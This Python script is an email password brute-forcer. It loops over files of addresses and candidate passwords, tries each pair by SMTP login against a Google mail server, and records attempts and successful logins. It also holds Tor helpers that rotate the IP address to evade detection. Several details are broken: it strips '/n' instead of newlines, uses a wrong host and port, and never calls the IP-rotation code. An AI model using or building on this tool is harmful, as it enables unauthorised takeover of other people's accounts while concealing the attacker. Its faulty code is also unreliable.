import smtplib

passlist = r"passwords.txt"
mails = r"mails.txt"
tried = r"tried.txt"
found = r"found.txt"

passlist_ = [x.strip("/n") for x in open(passlist , "r").readlines()]
mails_ = [x.strip("/n") for x in open(mails , "r").readlines()]
tried_ = [x.strip("/n") for x in open(tried , "r").readlines()]
found_ = [x.strip("/n") for x in open(found , "r").readlines()]

import requests
from stem.control import Controller
from stem import Signal

def renew_connection():
    with Controller.from_port(port=9051) as p:
        p.authenticate()
        p.signal(Signal.NEWNYM)

def get_tor_session():
    session = requests.Session()

    session.proxies = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"}
    return session

def changeIP():
    from colorama import Fore
    B , G , W = Fore.BLUE , Fore.CYAN , Fore.YELLOW
    ipc = requests.get("https://httpbin.org/ip").json()['origin']
    print(f"{B}[{G}>{B}]{W} Current ip : {G}{ipc}")
    renew_connection()
    s = get_tor_session()
    por = {"http": "http://localhost:9876", "https": "http://localhost:9876"}
    ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
    print(f"{B}[{G}>{B}]{W} Changed ip : {G}{ipc}")



def main():
    res = crack(mails_ , passlist_)
    if res:
        print("Password found")
        print(res)
        with open(found , "a") as f:
            f.write(res)

def crack(mails , passwords):
    for m in mails:
        for n , pas in enumerate(passwords):
            t = len(passwords)
            print("Trying password" + str(pas) +" " + str(n)+"/"+str(t))
            if (str(m) + str(pas)) in tried_:
                print("Password already tried")
                continue
            else:
                with open(tried, "a") as tr:
                    tr.write(str(m) + str(pas))
            try:
                server = smtplib.SMTP("smtp.google", 463)

                server.starttls()
                server.ehlo()

                server.login(m, pas)
                if (str(m) + str(pas)) in found_:
                    print("Password already found")
                    return False
                else:
                    print("Password found "+ str(m)+ " / "+ str(pas))
                    with open(found, "a") as fo:
                        fo.write(str(m) + str(pas))

                server.close()

                break

            except smtplib.SMTPAuthenticationError:
                print("failed")
                continue
    return False


